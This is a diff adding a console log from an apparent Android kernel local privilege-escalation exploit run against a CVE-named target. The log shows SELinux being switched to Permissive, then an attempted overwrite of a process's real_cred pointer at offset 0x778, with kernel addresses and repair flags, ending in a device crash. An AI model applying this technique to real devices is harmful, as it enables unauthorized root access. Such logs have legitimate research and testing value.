@@ -1,0 +1,40 @@
+[06:16:06] === preflight ===
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
+5.10.236-android12-9-o-gaf2075ad2c06
+Enforcing
+e7dac937-4260-4ab4-9a9c-61fb06871a96
+ 06:16:12 up 5 min,  0 users,  load average: 6.37, 8.10, 4.42
+6.37 8.10 4.42 1/7564 17847
+[06:16:13]   clearing leftover glx* from previous runs:
+    remaining: 0
+./exploit_guard: 1 file pushed, 0 skipped. 22.0 MB/s (73008 bytes in 0.003s)
+./exploit_guard: 1 file pushed, 0 skipped. 22.9 MB/s (73008 bytes in 0.003s)
+[06:16:16] === step 1: SELinux Permissive ===
+[06:17:10]   W1 round 1: Enforcing
+[06:18:12]   W1 round 2: Enforcing
+[06:19:11]   W1 round 3: Enforcing
+[06:20:04]   W1 round 4: Permissive
+[06:20:06] === step 2: host-side kernel log (dmesg poll, deduped by timestamp) ===
+[06:20:07]   /dev/kmsg NOT readable (expected here) — polling dmesg from the host
+run_bootA.sh: line 152: D:/Desktop/cve202643499/out/run10_061604/klog.host: No such file or directory
+[06:20:16]   klog lines after 5s: 
+[06:20:17] === step 3: load settle (max 15s, threshold 16) ===
+[06:20:21]   load1=4.97
+[06:20:24] === step 4: LT child (pure userspace spin, NO_EXEC) ===
+[06:20:59]   task=0xffffff88d0744a00 child_pid=25128 lt_parent=23116
+[06:21:03]   baseline: Uid: 2000 2000 2000 2000
+[06:21:05] === step 5: 0x778 shot(s) (real_cred) ===
+[06:21:08]   [w778r1] ONE shot: off=0x778 chainwait=6000ms hold=7200s nodrain=0 
+[06:21:56]   [w778r1] shot wall-clock: 45s
+    W7[W7] write value = private cred page 0xffffff8874e9ade0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff8874e9ade0
+    W7[W7] write_target= 0xffffff88d0745178
+    probe_state    = D
+    probe_done     = 1
+    ✗ W7[W7] miss (probe_state=D)
+    W7[W7] PIN child 30688 holds the payload page 7200s; writer returns now
+[06:22:04]   [w778r1] probe_state=D  (D=landed, R=miss, S=blocked)
+error: closed
+[06:22:26]   !! DEVICE GONE after w778 round 1
